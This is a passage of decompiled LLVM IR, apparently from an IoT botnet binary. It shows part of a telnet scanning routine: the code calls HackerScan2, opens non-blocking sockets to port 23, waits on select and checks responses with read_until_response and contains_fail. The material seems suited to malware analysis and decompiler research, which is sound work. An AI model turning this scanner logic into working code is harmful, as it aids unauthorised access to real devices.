  %v0_804cabe = load i32, i32* %eax.global-to-local, align 4
  %v1_804cabe = add i32 %v0_804cabe, 4
  store i32 %v1_804cabe, i32* %eax.global-to-local, align 4
  %v0_804cac1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cac1 = inttoptr i32 %v1_804cabe to i32*
  store i32 %v0_804cac1, i32* %v2_804cac1, align 4
  %v0_804cac3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cac3 = add i32 %v0_804cac3, 4
  %v0_804cac6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cac6 = inttoptr i32 %v1_804cac3 to i32*
  store i32 %v0_804cac6, i32* %v2_804cac6, align 4
  store i32 %v1_804ca82, i32* %edx.global-to-local, align 4
  store i32 %v2_804ca85, i32* @eax, align 4
  store i32 %v2_804ca85, i32* %v1_804ca85, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804caeb = call i32 @HackerScan2(i32 %v6_804ca1b)
  %v0_804caf5 = load i32, i32* @ebx, align 4
  %v1_804caf7 = mul i32 %v0_804caf5, 4
  store i32 %v1_804caf7, i32* %edx.global-to-local, align 4
  %v2_804cb05 = mul i32 %v0_804caf5, 28
  %v2_804cb07 = add i32 %v2_804cb05, %v2_804c8ed
  %v1_804cb09 = add i32 %v2_804cb07, 4
  store i32 %v1_804cb09, i32* %eax.global-to-local, align 4
  %v2_804cb0c = inttoptr i32 %v1_804cb09 to i32*
  store i32 %v1_804caeb, i32* %v2_804cb0c, align 4
  br label %dec_label_pc_804cc25

dec_label_pc_804cb13:                             ; preds = %dec_label_pc_804ca48
  %v5_804cb29 = load i8, i8* %v4_804ca5e, align 1
  %v6_804cb29 = zext i8 %v5_804cb29 to i32
  %v9_804cb29 = or i32 %v6_804cb29, %v8_804ca1b
  store i32 %v9_804cb29, i32* %eax.global-to-local, align 4
  %v4_804cb2d = icmp eq i8 %v5_804cb29, 0
  %v1_804cb2f = icmp eq i1 %v4_804cb2d, false
  br i1 %v1_804cb2f, label %dec_label_pc_804cc25, label %dec_label_pc_804cb35

dec_label_pc_804cb35:                             ; preds = %dec_label_pc_804cb13
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804cb4d = add i32 %v2_804cb4d, %v2_804c9ca
  %v4_804cb4d = inttoptr i32 %v3_804cb4d to i8*
  %v5_804cb4d = load i8, i8* %v4_804cb4d, align 1
  %v1_804cb51 = add i8 %v5_804cb4d, 1
  store i8 %v1_804cb51, i8* %v4_804cb4d, align 1
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804cb87 = add i32 %v2_804cb87, %v2_804c9ca
  %v4_804cb87 = inttoptr i32 %v3_804cb87 to i8*
  %v5_804cb87 = load i8, i8* %v4_804cb87, align 2
  %v6_804cb87 = zext i8 %v5_804cb87 to i32
  %v9_804cb87 = or i32 %v6_804cb87, %v8_804ca1b
  %v1_804cb8b = add i32 %v9_804cb87, 1
  store i32 %v1_804cb8b, i32* @esi, align 4
  %v1_804cba5 = trunc i32 %v1_804cb8b to i8
  store i8 %v1_804cba5, i8* %v4_804cb87, align 2
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v5_804cbbf = load i8, i8* %v4_804cb4d, align 1
  %v10_804cbc3 = icmp eq i8 %v5_804cbbf, 22
  %v1_804cbc5 = icmp eq i1 %v10_804cbc3, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804cbc5, label %dec_label_pc_804cbe7, label %dec_label_pc_804cbc7

dec_label_pc_804cbc7:                             ; preds = %dec_label_pc_804cb35
  store i8 1, i8* %v4_804ca5e, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804cbe7:                             ; preds = %dec_label_pc_804cb35
  %v5_804cbfd = load i8, i8* %v4_804cb87, align 2
  %v6_804cbfd = zext i8 %v5_804cbfd to i32
  %v9_804cbfd = or i32 %v6_804cbfd, %v8_804ca1b
  store i32 %v9_804cbfd, i32* %eax.global-to-local, align 4
  %v10_804cc01 = icmp eq i8 %v5_804cbfd, 22
  %v1_804cc03 = icmp eq i1 %v10_804cc01, false
  br i1 %v1_804cc03, label %dec_label_pc_804cc25, label %dec_label_pc_804cc05

dec_label_pc_804cc05:                             ; preds = %dec_label_pc_804cbe7
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca5e, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804cc25:                             ; preds = %dec_label_pc_804cbe7, %dec_label_pc_804cb13, %dec_label_pc_804ca6a
  store i32 2, i32* %stack_var_-608, align 4
  %v0_804cc2e = load i32, i32* @esp, align 4
  %v1_804cc31 = add i32 %v0_804cc2e, -16
  %v2_804cc31 = inttoptr i32 %v1_804cc31 to i32*
  store i32 23, i32* %v2_804cc31, align 4
  %v0_804cc33 = load i32, i32* %stack_var_-608, align 4
  %v1_804cc33 = call i32 @htons(i32 %v0_804cc33)
  %v0_804cc38 = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-600, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v1_804cc70 = add i32 %v2_804c9cc, 4
  store i32 %v1_804cc70, i32* %eax.global-to-local, align 4
  %v1_804cc73 = inttoptr i32 %v1_804cc70 to i32*
  %v2_804cc73 = load i32, i32* %v1_804cc73, align 4
  store i32 %v2_804cc73, i32* %eax.global-to-local, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804cc81 = add i32 %v0_804cc38, 8
  %v2_804cc81 = inttoptr i32 %v1_804cc81 to i32*
  store i32 0, i32* %v2_804cc81, align 4
  %v1_804cc83 = add i32 %v0_804cc38, 4
  %v2_804cc83 = inttoptr i32 %v1_804cc83 to i32*
  store i32 1, i32* %v2_804cc83, align 4
  %v2_804cc85 = inttoptr i32 %v0_804cc38 to i32*
  store i32 2, i32* %v2_804cc85, align 4
  %v2_804cc87 = load i32, i32* %stack_var_-600, align 4
  %sext = mul i32 %v1_804cc33, 65536
  %v3_804cc87 = sdiv i32 %sext, 65536
  %v4_804cc87 = call i32 @socket(i32 %v3_804cc87, i32 %v2_804cc73, i32 %v2_804cc87)
  store i32 %v4_804cc87, i32* @esi, align 4
  %v0_804cc94 = load i32, i32* @ebx, align 4
  %v2_804cca4 = mul i32 %v0_804cc94, 28
  %v3_804cca6 = add i32 %v2_804cca4, %v2_804c8ed
  %v4_804cca6 = inttoptr i32 %v3_804cca6 to i32*
  store i32 %v4_804cc87, i32* %v4_804cca6, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804ccbf = inttoptr i32 %v2_804c9cc to i32*
  %v4_804ccbf = load i32, i32* %v3_804ccbf, align 4
  store i32 %v4_804ccbf, i32* %eax.global-to-local, align 4
  %v10_804ccc2 = icmp eq i32 %v4_804ccbf, -1
  br i1 %v10_804ccc2, label %dec_label_pc_804dadc, label %dec_label_pc_804cccb

dec_label_pc_804cccb:                             ; preds = %dec_label_pc_804cc25
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cce1 = load i32, i32* %v3_804ccbf, align 4
  store i32 %v4_804cce1, i32* %eax.global-to-local, align 4
  %v0_804cce4 = load i32, i32* @esp, align 4
  %v1_804cce7 = add i32 %v0_804cce4, -8
  %v2_804cce7 = inttoptr i32 %v1_804cce7 to i32*
  store i32 0, i32* %v2_804cce7, align 4
  %v1_804cce9 = add i32 %v0_804cce4, -12
  %v2_804cce9 = inttoptr i32 %v1_804cce9 to i32*
  store i32 3, i32* %v2_804cce9, align 4
  %v0_804cceb = load i32, i32* %eax.global-to-local, align 4
  %v2_804cceb = add i32 %v0_804cce4, -16
  %v3_804cceb = inttoptr i32 %v2_804cceb to i32*
  store i32 %v0_804cceb, i32* %v3_804cceb, align 4
  %v1_804ccec = load i32, i32* %stack_var_-600, align 4
  %v3_804ccec = call i32 @__libc_fcntl(i32 %v2_804cc73, i32 %v1_804ccec, i32 0)
  %v0_804ccf1 = load i32, i32* @esp, align 4
  %v12_804ccf6 = or i32 %v3_804ccec, 2048
  store i32 %v12_804ccf6, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cd0f = load i32, i32* %v3_804ccbf, align 4
  store i32 %v4_804cd0f, i32* %eax.global-to-local, align 4
  %v2_804cd15 = add i32 %v0_804ccf1, 8
  %v3_804cd15 = inttoptr i32 %v2_804cd15 to i32*
  store i32 %v12_804ccf6, i32* %v3_804cd15, align 4
  %v1_804cd16 = add i32 %v0_804ccf1, 4
  %v2_804cd16 = inttoptr i32 %v1_804cd16 to i32*
  store i32 4, i32* %v2_804cd16, align 4
  %v0_804cd18 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd18 = inttoptr i32 %v0_804ccf1 to i32*
  store i32 %v0_804cd18, i32* %v3_804cd18, align 4
  %v1_804cd19 = load i32, i32* %stack_var_-600, align 4
  %v3_804cd19 = call i32 @__libc_fcntl(i32 %v2_804cc73, i32 %v1_804cd19, i32 0)
  %v0_804cd1e = load i32, i32* @esp, align 4
  store i32 %v2_804c87b, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cd3d = load i32, i32* %v3_804ccbf, align 4
  store i32 %v4_804cd3d, i32* %eax.global-to-local, align 4
  %v1_804cd43 = add i32 %v0_804cd1e, 8
  %v2_804cd43 = inttoptr i32 %v1_804cd43 to i32*
  store i32 16, i32* %v2_804cd43, align 4
  %v2_804cd45 = add i32 %v0_804cd1e, 4
  %v3_804cd45 = inttoptr i32 %v2_804cd45 to i32*
  store i32 %v2_804c87b, i32* %v3_804cd45, align 4
  %v0_804cd46 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd46 = inttoptr i32 %v0_804cd1e to i32*
  store i32 %v0_804cd46, i32* %v3_804cd46, align 4
  %v1_804cd47 = load i32, i32* %stack_var_-600, align 4
  %v3_804cd47 = call i32 @__libc_connect(i32 %v2_804cc73, i32 %v1_804cd47, i32 0)
  store i32 %v3_804cd47, i32* %eax.global-to-local, align 4
  %v10_804cd4f = icmp eq i32 %v3_804cd47, -1
  %v1_804cd52 = icmp eq i1 %v10_804cd4f, false
  br i1 %v1_804cd52, label %dec_label_pc_804cda5, label %dec_label_pc_804cd54

dec_label_pc_804cd54:                             ; preds = %dec_label_pc_804cccb
  %v1_804cd54 = call i32 @__errno_location(i32 %v2_804cc73)
  store i32 %v1_804cd54, i32* %eax.global-to-local, align 4
  %v1_804cd59 = inttoptr i32 %v1_804cd54 to i32*
  %v2_804cd59 = load i32, i32* %v1_804cd59, align 4
  store i32 %v2_804cd59, i32* %eax.global-to-local, align 4
  %v9_804cd5b = icmp eq i32 %v2_804cd59, 115
  br i1 %v9_804cd5b, label %dec_label_pc_804cda5, label %dec_label_pc_804cd60

dec_label_pc_804cd60:                             ; preds = %dec_label_pc_804cd54
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cd76 = load i32, i32* %v3_804ccbf, align 4
  store i32 %v4_804cd76, i32* %eax.global-to-local, align 4
  %v0_804cd79 = load i32, i32* @esp, align 4
  %v2_804cd7c = add i32 %v0_804cd79, -16
  %v3_804cd7c = inttoptr i32 %v2_804cd7c to i32*
  store i32 %v4_804cd76, i32* %v3_804cd7c, align 4
  %v1_804cd7d = call i32 @sclose(i32 %v2_804cc73)
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca5e, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804cda5:                             ; preds = %dec_label_pc_804cd54, %dec_label_pc_804cccb
  store i8 1, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804c9d1, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804cde6:                             ; preds = %dec_label_pc_804ca05
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804cdf0, i32* @edi, align 4
  %v5_804cdf7 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804ce15 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804ce15 = load i32, i32* %v3_804ce15, align 4
  %v2_804ce1a = udiv i32 %v4_804ce15, 32
  store i32 %v2_804ce1a, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804ce33 = load i32, i32* %v3_804ce15, align 4
  %v1_804ce36 = urem i32 %v4_804ce33, 32
  store i32 %v1_804ce36, i32* %eax.global-to-local, align 4
  %v0_804ce39 = load i32, i32* @ebp, align 4
  %v2_804ce39 = mul nuw nsw i32 %v2_804ce1a, 4
  %v3_804ce39 = add nsw i32 %v2_804ce39, -316
  %v4_804ce39 = add i32 %v3_804ce39, %v0_804ce39
  %v5_804ce39 = inttoptr i32 %v4_804ce39 to i32*
  %v6_804ce39 = load i32, i32* %v5_804ce39, align 4
  %v9_804ce39 = shl i32 1, %v1_804ce36
  %v12_804ce39 = or i32 %v6_804ce39, %v9_804ce39
  store i32 %v12_804ce39, i32* %v5_804ce39, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804ce6a = load i32, i32* %v3_804ce15, align 4
  %v1_804ce6d = add i32 %v4_804ce6a, 1
  store i32 %v1_804ce6d, i32* %edx.global-to-local, align 4
  %v0_804ce70 = load i32, i32* @esp, align 4
  %v2_804ce79 = add i32 %v0_804ce70, -16
  %v3_804ce79 = inttoptr i32 %v2_804ce79 to i32*
  store i32 %v2_804ce73, i32* %v3_804ce79, align 4
  %v1_804ce7a = add i32 %v0_804ce70, -20
  %v2_804ce7a = inttoptr i32 %v1_804ce7a to i32*
  store i32 0, i32* %v2_804ce7a, align 4
  store i32 %v2_804cdf0, i32* %eax.global-to-local, align 4
  %v2_804ce82 = add i32 %v0_804ce70, -24
  %v3_804ce82 = inttoptr i32 %v2_804ce82 to i32*
  store i32 %v2_804cdf0, i32* %v3_804ce82, align 4
  %v1_804ce83 = add i32 %v0_804ce70, -28
  %v2_804ce83 = inttoptr i32 %v1_804ce83 to i32*
  store i32 0, i32* %v2_804ce83, align 4
  %v0_804ce85 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ce85 = add i32 %v0_804ce70, -32
  %v3_804ce85 = inttoptr i32 %v2_804ce85 to i32*
  store i32 %v0_804ce85, i32* %v3_804ce85, align 4
  %v0_804ce86 = load i32, i32* %stack_var_-328, align 4
  %v2_804ce86 = load i32, i32* %stack_var_-320, align 4
  %v5_804ce86 = call i32 @__libc_select(i32 %v0_804ce86, i32 10, i32 %v2_804ce86, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ce86, i32* %eax.global-to-local, align 4
  %v0_804ce8b = load i32, i32* @esp, align 4
  %v12_804ce91 = icmp eq i32 %v5_804ce86, 1
  %v1_804ce95 = icmp eq i1 %v12_804ce91, false
  br i1 %v1_804ce95, label %dec_label_pc_804d03b, label %dec_label_pc_804ce9b

dec_label_pc_804ce9b:                             ; preds = %dec_label_pc_804cde6
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cec5 = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804cec5, i32* %edx.global-to-local, align 4
  %v2_804ced1 = add i32 %v0_804ce8b, 16
  %v3_804ced1 = inttoptr i32 %v2_804ced1 to i32*
  store i32 %v2_804cecb, i32* %v3_804ced1, align 4
  store i32 %v2_804ced2, i32* %eax.global-to-local, align 4
  %v2_804ced8 = add i32 %v0_804ce8b, 12
  %v3_804ced8 = inttoptr i32 %v2_804ced8 to i32*
  store i32 %v2_804ced2, i32* %v3_804ced8, align 4
  %v1_804ced9 = add i32 %v0_804ce8b, 8
  %v2_804ced9 = inttoptr i32 %v1_804ced9 to i32*
  store i32 4, i32* %v2_804ced9, align 4
  %v1_804cedb = add i32 %v0_804ce8b, 4
  %v2_804cedb = inttoptr i32 %v1_804cedb to i32*
  store i32 1, i32* %v2_804cedb, align 4
  %v0_804cedd = load i32, i32* %edx.global-to-local, align 4
  %v3_804cedd = inttoptr i32 %v0_804ce8b to i32*
  store i32 %v0_804cedd, i32* %v3_804cedd, align 4
  %v0_804cede = load i32, i32* %stack_var_-336, align 4
  %v1_804cede = load i32, i32* %stack_var_-332, align 4
  %v2_804cede = load i32, i32* %stack_var_-328, align 4
  %v4_804cede = load i32, i32* %stack_var_-320, align 4
  %v5_804cede = call i32 @getsockopt(i32 %v0_804cede, i32 %v1_804cede, i32 %v2_804cede, i32 10, i32 %v4_804cede)
  %v0_804cee3 = load i32, i32* @esp, align 4
  %v3_804cee6 = load i32, i32* %stack_var_-336, align 4
  %v1_804ceec = icmp eq i32 %v3_804cee6, 0
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cf66 = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804cf66, i32* %eax.global-to-local, align 4
  br i1 %v1_804ceec, label %dec_label_pc_804cf50, label %dec_label_pc_804cef0

dec_label_pc_804cef0:                             ; preds = %dec_label_pc_804ce9b
  %v2_804cf0c = add i32 %v0_804cee3, 16
  %v3_804cf0c = inttoptr i32 %v2_804cf0c to i32*
  store i32 %v4_804cf66, i32* %v3_804cf0c, align 4
  %v0_804cf0d = load i32, i32* %stack_var_-336, align 4
  %v1_804cf0d = call i32 @sclose(i32 %v0_804cf0d)
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804cf46 = add i32 %v2_804c976, %v2_804c9ca
  %v4_804cf46 = inttoptr i32 %v3_804cf46 to i8*
  store i8 1, i8* %v4_804cf46, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804cf50:                             ; preds = %dec_label_pc_804ce9b
  %v1_804cf6c = add i32 %v0_804cee3, 24
  %v2_804cf6c = inttoptr i32 %v1_804cf6c to i32*
  store i32 0, i32* %v2_804cf6c, align 4
  %v1_804cf6e = add i32 %v0_804cee3, 20
  %v2_804cf6e = inttoptr i32 %v1_804cf6e to i32*
  store i32 3, i32* %v2_804cf6e, align 4
  %v0_804cf70 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cf70 = add i32 %v0_804cee3, 16
  %v3_804cf70 = inttoptr i32 %v2_804cf70 to i32*
  store i32 %v0_804cf70, i32* %v3_804cf70, align 4
  %v0_804cf71 = load i32, i32* %stack_var_-336, align 4
  %v1_804cf71 = load i32, i32* %stack_var_-332, align 4
  %v2_804cf71 = load i32, i32* %stack_var_-328, align 4
  %v3_804cf71 = call i32 @__libc_fcntl(i32 %v0_804cf71, i32 %v1_804cf71, i32 %v2_804cf71)
  %v0_804cf76 = load i32, i32* @esp, align 4
  %v13_804cf7b = and i32 %v3_804cf71, -2049
  store i32 %v13_804cf7b, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804cf94 = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804cf94, i32* %eax.global-to-local, align 4
  %v2_804cf9a = add i32 %v0_804cf76, 8
  %v3_804cf9a = inttoptr i32 %v2_804cf9a to i32*
  store i32 %v13_804cf7b, i32* %v3_804cf9a, align 4
  %v1_804cf9b = add i32 %v0_804cf76, 4
  %v2_804cf9b = inttoptr i32 %v1_804cf9b to i32*
  store i32 4, i32* %v2_804cf9b, align 4
  %v0_804cf9d = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf9d = inttoptr i32 %v0_804cf76 to i32*
  store i32 %v0_804cf9d, i32* %v3_804cf9d, align 4
  %v0_804cf9e = load i32, i32* %stack_var_-336, align 4
  %v1_804cf9e = load i32, i32* %stack_var_-332, align 4
  %v2_804cf9e = load i32, i32* %stack_var_-328, align 4
  %v3_804cf9e = call i32 @__libc_fcntl(i32 %v0_804cf9e, i32 %v1_804cf9e, i32 %v2_804cf9e)
  store i32 0, i32* %v1_804c9d1, align 4
  %v1_804cfe2 = add i32 %v2_804c9cc, 20
  %v2_804cfe2 = inttoptr i32 %v1_804cfe2 to i16*
  store i16 0, i16* %v2_804cfe2, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v1_804d000 = add i32 %v2_804c9cc, 24
  store i32 %v1_804d000, i32* %eax.global-to-local, align 4
  %v1_804d003 = inttoptr i32 %v1_804d000 to i32*
  %v2_804d003 = load i32, i32* %v1_804d003, align 4
  store i32 %v2_804d003, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804d00c = load i32, i32* @esp, align 4
  %v2_804d00f = add i32 %v0_804d00c, -8
  %v3_804d00f = inttoptr i32 %v2_804d00f to i32*
  store i32 1024, i32* %v3_804d00f, align 4
  %v1_804d010 = add i32 %v0_804d00c, -12
  %v2_804d010 = inttoptr i32 %v1_804d010 to i32*
  store i32 0, i32* %v2_804d010, align 4
  %v0_804d012 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d012 = add i32 %v0_804d00c, -16
  %v3_804d012 = inttoptr i32 %v2_804d012 to i32*
  store i32 %v0_804d012, i32* %v3_804d012, align 4
  %v0_804d013 = load i32, i32* %stack_var_-336, align 4
  %v1_804d013 = load i32, i32* %stack_var_-332, align 4
  %v2_804d013 = load i32, i32* %stack_var_-328, align 4
  %v3_804d013 = inttoptr i32 %v0_804d013 to i8*
  %v4_804d013 = call i32 @__GI_memset(i8* %v3_804d013, i32 %v1_804d013, i32 %v2_804d013)
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d03b:                             ; preds = %dec_label_pc_804cde6
  %v13_804d03b = icmp eq i32 %v5_804ce86, -1
  %v1_804d03f = icmp eq i1 %v13_804d03b, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d03f, label %dec_label_pc_804d0a1, label %dec_label_pc_804d041

dec_label_pc_804d041:                             ; preds = %dec_label_pc_804d03b
  %v4_804d057 = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804d057, i32* %eax.global-to-local, align 4
  %v2_804d05d = add i32 %v0_804ce8b, 16
  %v3_804d05d = inttoptr i32 %v2_804d05d to i32*
  store i32 %v4_804d057, i32* %v3_804d05d, align 4
  %v1_804d05e = call i32 @sclose(i32 %v5_804ce86)
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d097 = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d097 = inttoptr i32 %v3_804d097 to i8*
  store i8 1, i8* %v4_804d097, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d0a1:                             ; preds = %dec_label_pc_804d03b
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v2_804d0bc = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804d0bc, i32* %eax.global-to-local, align 4
  %v1_804d0be = add i32 %v2_804d0bc, 6
  store i32 %v1_804d0be, i32* @ebx, align 4
  %v1_804d0c4 = add i32 %v0_804ce8b, 16
  %v2_804d0c4 = inttoptr i32 %v1_804d0c4 to i32*
  store i32 0, i32* %v2_804d0c4, align 4
  %v1_804d0c6 = inttoptr i32 %v5_804ce86 to i32*
  %v2_804d0c6 = call i32 @__GI_time(i32* %v1_804d0c6)
  store i32 %v2_804d0c6, i32* %eax.global-to-local, align 4
  %v0_804d0ce = load i32, i32* @ebx, align 4
  %v7_804d0ce = icmp ult i32 %v0_804d0ce, %v2_804d0c6
  %v1_804d0d0 = icmp eq i1 %v7_804d0ce, false
  br i1 %v1_804d0d0, label %dec_label_pc_804dadc, label %dec_label_pc_804d0d6

dec_label_pc_804d0d6:                             ; preds = %dec_label_pc_804d0a1
  %v0_804d0cb = load i32, i32* @esp, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v4_804d0ec = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804d0ec, i32* %eax.global-to-local, align 4
  %v3_804d0f2 = inttoptr i32 %v0_804d0cb to i32*
  store i32 %v4_804d0ec, i32* %v3_804d0f2, align 4
  %v0_804d0f3 = load i32, i32* %stack_var_-336, align 4
  %v1_804d0f3 = call i32 @sclose(i32 %v0_804d0f3)
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d12c = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d12c = inttoptr i32 %v3_804d12c to i8*
  store i8 1, i8* %v4_804d12c, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d136:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v1_804d14e = add i32 %v2_804c9cc, 24
  store i32 %v1_804d14e, i32* %eax.global-to-local, align 4
  %v1_804d151 = inttoptr i32 %v1_804d14e to i32*
  %v2_804d151 = load i32, i32* %v1_804d151, align 4
  store i32 %v2_804d151, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d169 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d169 = load i32, i32* %v3_804d169, align 4
  store i32 %v4_804d169, i32* %eax.global-to-local, align 4
  %v0_804d16c = load i32, i32* @esp, align 4
  %v1_804d16f = add i32 %v0_804d16c, -16
  %v2_804d16f = inttoptr i32 %v1_804d16f to i32*
  store i32 134608124, i32* %v2_804d16f, align 4
  %v1_804d174 = add i32 %v0_804d16c, -20
  %v2_804d174 = inttoptr i32 %v1_804d174 to i32*
  store i32 1024, i32* %v2_804d174, align 4
  %v0_804d179 = load i32, i32* @ebx, align 4
  %v2_804d179 = add i32 %v0_804d16c, -24
  %v3_804d179 = inttoptr i32 %v2_804d179 to i32*
  store i32 %v0_804d179, i32* %v3_804d179, align 4
  %v5_804d17a = add i32 %v0_804d16c, -28
  %v6_804d17a = inttoptr i32 %v5_804d17a to i32*
  store i32 10, i32* %v6_804d17a, align 4
  %v0_804d17d = load i32, i32* %eax.global-to-local, align 4
  %v2_804d17d = add i32 %v0_804d16c, -32
  %v3_804d17d = inttoptr i32 %v2_804d17d to i32*
  store i32 %v0_804d17d, i32* %v3_804d17d, align 4
  %v1_804d17e = call i32 @read_until_response(i32 %v6_804ca1b)
  %v0_804d183 = load i32, i32* @esp, align 4
  %v1_804d186 = icmp eq i32 %v1_804d17e, 0
  store i32 %v1_804c9bc, i32* @edx, align 4
  store i32 %v2_804c9cc, i32* %eax.global-to-local, align 4
  br i1 %v1_804d186, label %dec_label_pc_804d1f7, label %dec_label_pc_804d18a

dec_label_pc_804d18a:                             ; preds = %dec_label_pc_804d136
  store i32 %v1_804d14e, i32* %eax.global-to-local, align 4
  %v2_804d1a5 = load i32, i32* %v1_804d151, align 4
  store i32 %v2_804d1a5, i32* %eax.global-to-local, align 4
  %v2_804d1aa = add i32 %v0_804d183, 16
  %v3_804d1aa = inttoptr i32 %v2_804d1aa to i32*
  store i32 %v2_804d1a5, i32* %v3_804d1aa, align 4
  %v0_804d1ab = call i32 @contains_fail()
  %v1_804d1b3 = icmp eq i32 %v0_804d1ab, 0
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d1b3, label %dec_label_pc_804d1d7, label %dec_label_pc_804d1b7

dec_label_pc_804d1b7:                             ; preds = %dec_label_pc_804d18a
  store i8 0, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d1d7:                             ; preds = %dec_label_pc_804d18a
  store i8 3, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d1f7:                             ; preds = %dec_label_pc_804d136
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v2_804d212 = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804d212, i32* %eax.global-to-local, align 4
